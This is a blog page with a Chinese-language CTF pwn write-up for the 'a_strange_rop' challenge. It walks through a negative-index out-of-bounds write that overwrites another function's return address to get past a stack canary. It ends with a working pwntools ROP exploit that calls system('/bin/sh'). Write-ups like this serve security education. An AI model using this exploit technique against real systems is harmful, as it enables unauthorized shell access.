@@ -1,0 +1,757 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" >
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/666.jpg">
+  <link rel="icon" href="/img/666.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#ffffff">
+  <meta name="author" content="roxy">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="题目来自2025XSWCTF决赛的pwn题: a_atrange_rop 赛后才做出来… 题目为64位动态链接elf文件 保护为NX和canary 既然题目叫a_stranre_rop 我们先看看有没有gadget 1ROPgadget --binary .&#x2F;a_strange_rop | grep &quot;pop rdi&quot;  找到了pop rdi; ret;这样的一个gadget">
+<meta property="og:type" content="article">
+<meta property="og:title" content="a_strange_rop">
+<meta property="og:url" content="https://rr00xxyy.github.io/2025/12/25/a-strange-rop/index.html">
+<meta property="og:site_name" content="roxy&#39;s blog">
+<meta property="og:description" content="题目来自2025XSWCTF决赛的pwn题: a_atrange_rop 赛后才做出来… 题目为64位动态链接elf文件 保护为NX和canary 既然题目叫a_stranre_rop 我们先看看有没有gadget 1ROPgadget --binary .&#x2F;a_strange_rop | grep &quot;pop rdi&quot;  找到了pop rdi; ret;这样的一个gadget">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://rr00xxyy.github.io/images/1.png">
+<meta property="og:image" content="https://rr00xxyy.github.io/images/2.png">
+<meta property="og:image" content="https://rr00xxyy.github.io/images/3.png">
+<meta property="article:published_time" content="2025-12-24T20:49:48.000Z">
+<meta property="article:modified_time" content="2026-04-15T16:34:31.917Z">
+<meta property="article:author" content="roxy">
+<meta property="article:tag" content="gdb">
+<meta property="article:tag" content="内存布局">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://rr00xxyy.github.io/images/1.png">
+  
+  
+  
+  <title>a_strange_rop - roxy&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/mui-fluid.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"rr00xxyy.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body class="post-page post-page">
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/a.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="a_strange_rop"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-12-25 04:49" pubdate>
+          2025年12月25日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          26 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">a_strange_rop</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>题目来自2025XSWCTF决赛的pwn题: <code>a_atrange_rop</code></p>
+<p>赛后才做出来…</p>
+<p>题目为64位动态链接elf文件</p>
+<p>保护为<code>NX</code>和<code>canary</code></p>
+<p>既然题目叫a_stranre_rop</p>
+<p>我们先看看有没有gadget</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary ./a_strange_rop | grep <span class="hljs-string">&quot;pop rdi&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>找到了<code>pop rdi; ret;</code>这样的一个gadget</p>
+<p>先观察一下题目逻辑</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">undefined8 <span class="hljs-title function_">main</span><span class="hljs-params">(EVP_PKEY_CTX *param_1)</span><br>&#123;<br>  <span class="hljs-type">int</span> iVar1;<br>  <br>  init(param_1);<br>  iVar1 = game();<br>  <span class="hljs-keyword">if</span> (iVar1 == <span class="hljs-number">1</span>) &#123;<br>    win();<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>init为初始化函数，无实际意义，忽略</p>
+<p>我们先来看一下win函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">win</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br><br>&#123;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;good!&quot;</span>);<br>  system(<span class="hljs-string">&quot;ababalabalabalawuwuwuuwyyyyy&quot;</span>);<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>可以看到即使调用了win也不会真的<code>win</code>，但是它为我们提供了<code>call system</code>这样一个系统调用的函数</p>
+<p>配合我们上面找到的gadget</p>
+<p>似乎很容易就能写出system(“&#x2F;bin&#x2F;sh”)</p>
+<p>来看看主逻辑game部分</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c">undefined8 <span class="hljs-title function_">game</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br><br>&#123;<br>  <span class="hljs-type">int</span> iVar1;<br>  <span class="hljs-type">int</span> iVar2;<br>  <span class="hljs-type">time_t</span> tVar3;<br>  undefined8 uVar4;<br>  <span class="hljs-type">long</span> in_FS_OFFSET;<br>  <span class="hljs-type">int</span> local_78;<br>  uint local_74;<br>  <span class="hljs-type">long</span> local_68 [<span class="hljs-number">11</span>];<br>  <span class="hljs-type">long</span> local_10;<br>  <br>  local_10 = *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);<br>  id = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">puts</span>(&amp;DAT_0040202b);<br>  tVar3 = time((<span class="hljs-type">time_t</span> *)<span class="hljs-number">0x0</span>);<br>  srand((uint)tVar3);<br>  <span class="hljs-keyword">for</span> (local_78 = <span class="hljs-number">0</span>; local_78 &lt; <span class="hljs-number">10</span>; local_78 = local_78 + <span class="hljs-number">1</span>) &#123;<br>    iVar1 = FUN_00401160();<br>    iVar2 = FUN_00401160();<br>    <span class="hljs-built_in">printf</span>(&amp;DAT_00402041,(ulong)id,(ulong)(uint)(iVar1 % <span class="hljs-number">0x14</span>),(ulong)(uint)(iVar2 % <span class="hljs-number">0x14</span>));<br>    (&amp;answer)[(<span class="hljs-type">int</span>)id] = (<span class="hljs-type">long</span>)(iVar2 % <span class="hljs-number">0x14</span> + iVar1 % <span class="hljs-number">0x14</span>);<br>    id = id + <span class="hljs-number">1</span>;<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(&amp;DAT_00402058);<br>  <span class="hljs-keyword">for</span> (; t &lt; <span class="hljs-number">0xb</span>; t = t + <span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-built_in">printf</span>(&amp;DAT_00402077);<br>    __isoc99_scanf(&amp;DAT_00402085,&amp;id);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-number">9</span> &lt; (<span class="hljs-type">int</span>)id) &#123;<br>      <span class="hljs-built_in">puts</span>(&amp;DAT_00402088);<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0x1bf52</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(&amp;DAT_004020a8);<br>    __isoc99_scanf(&amp;DAT_004020b0,local_68 + (<span class="hljs-type">int</span>)id);<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(&amp;DAT_004020b8);<br>  local_74 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">do</span> &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-number">9</span> &lt; (<span class="hljs-type">int</span>)local_74) &#123;<br>      uVar4 = <span class="hljs-number">1</span>;<br>LAB_00401548:<br>      <span class="hljs-keyword">if</span> (local_10 != *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) &#123;<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>        __stack_chk_fail();<br>      &#125;<br>      <span class="hljs-keyword">return</span> uVar4;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((&amp;answer)[(<span class="hljs-type">int</span>)local_74] != local_68[(<span class="hljs-type">int</span>)local_74]) &#123;<br>      <span class="hljs-built_in">printf</span>(&amp;DAT_004020d8,(ulong)local_74);<br>      uVar4 = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">goto</span> LAB_00401548;<br>    &#125;<br>    local_74 = local_74 + <span class="hljs-number">1</span>;<br>  &#125; <span class="hljs-keyword">while</span>( <span class="hljs-literal">true</span> );<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>运行起来是这么个样子</p>
+<p><img src="/images/1.png" srcset="/img/loading.gif" lazyload alt="交互"></p>
+<p>略微有点长，但是并不难理解，local_10为随机生成的canary值，因此不能直接溢出覆盖返回地址，否则会触发canary检测程序直接退出</p>
+<p>题目要求回答一些小学数学题目，全部回答正确就跳转到win函数，但是我们已经看到win函数并没有实际作用，因此思路依旧是覆盖返回地址为我们构造的rop链</p>
+<p>先来分析一下栈布局</p>
+<p>定义了一个数组local_68[11]</p>
+<p>可以分析得出</p>
+<p><img src="/images/2.png" srcset="/img/loading.gif" lazyload alt="栈布局大致如此"></p>
+<p>题目设置了一个小check机制，明明有0到9十道题目，但是数组设置了0到10十一个题目编号，而输入的题目编号大于9的时候程序自动退出，并大声斥责我们<em>你想干什么!</em></p>
+<p>我的第一个思路是设置题目编号为8，即local_68[9]所在的位置，向上填充至覆盖rip，执行rop链</p>
+<p>但是这个canary是我永远越不过的坎…</p>
+<p>思来想去，我突然注意到，题目编号大于9时会自动退出，<strong>但是</strong>题目却不检查负数编号!</p>
+<p>因此我们可以将题目设置为负数通过负索引去写前面的地址!</p>
+<p>用gdb看一看怎么个事儿</p>
+<p>我在第一次输入后打上了断点，输入编号<code>-1</code>并输入答案<code>666</code>，local_68在rbp下0x60的位置，我们看看更下面的情况</p>
+<p><img src="/images/3.png" srcset="/img/loading.gif" lazyload alt="地址情况"></p>
+<p>可以看到，正如我们分析的那般，<code>-1</code>索引写的<code>666</code>代表的<code>00029a</code>写在了local_68下方的地址，再认真一看，前方的<code>0x004014bc</code>不正是另一个函数的返回地址吗!</p>
+<p>我们只需要将索引设置为-3便可以覆盖另一个函数的返回地址来执行我们的rop链</p>
+<p>这个函数用canary将我们拦住，十分安全，可是，另一个函数却已经悄然被我们所攻克…</p>
+<p>题目也是十分贴心，<code>/bin/sh</code>字符串都帮我们准备好了</p>
+<p>接下来便很简单了</p>
+<p>exp也是十分优雅</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&#x27;host&#x27;</span>,port)<br><br>bin_sh = <span class="hljs-built_in">str</span>(<span class="hljs-number">4210808</span>)   <span class="hljs-comment"># 0x404078</span><br>call_system = <span class="hljs-built_in">str</span>(<span class="hljs-number">4199136</span>)   <span class="hljs-comment"># 0x4012e0</span><br>pop_rdi_ret = <span class="hljs-built_in">str</span>(<span class="hljs-number">4199153</span>)  <span class="hljs-comment"># 0x4012f1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_pair</span>(<span class="hljs-params">idx, val</span>):<br>    p.recvuntil(<span class="hljs-string">&#x27;题目编号:&#x27;</span>)<br>    p.send(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;idx&#125;</span>\n&quot;</span>.encode())<br>    p.recvuntil(<span class="hljs-string">&#x27;结果:&#x27;</span>)<br>    p.send(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;val&#125;</span>\n&quot;</span>.encode())<br><br>send_pair(-<span class="hljs-number">2</span>, bin_sh)    <span class="hljs-comment"># 写 /bin/sh</span><br>send_pair(-<span class="hljs-number">1</span>, call_system)   <span class="hljs-comment"># 调用 system</span><br>send_pair(-<span class="hljs-number">3</span>, pop_rdi_ret)  <span class="hljs-comment"># 覆盖另一个函数的rip</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>最后也是成功地拿到shell</p>
+<p>至此，终于理解题目为什么叫:<code>a_strange_rop</code>!</p>
+<p>感谢阅读!</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/pwn/" class="category-chain-item">pwn</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        
+        
+          <a href="/tags/gdb/" class="print-no-link">#gdb</a>
+        
+      
+        
+        
+          <a href="/tags/%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80/" class="print-no-link">#内存布局</a>
+        
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>a_strange_rop</div>
+      <div>https://rr00xxyy.github.io/2025/12/25/a-strange-rop/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>roxy</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年12月25日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2026年4月16日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/12/25/stack-pivot/" title="stack pivot">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">stack pivot</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+      <span class="footer-quote">It is no use crying over spilt milk</span>
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/mui-fluid.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
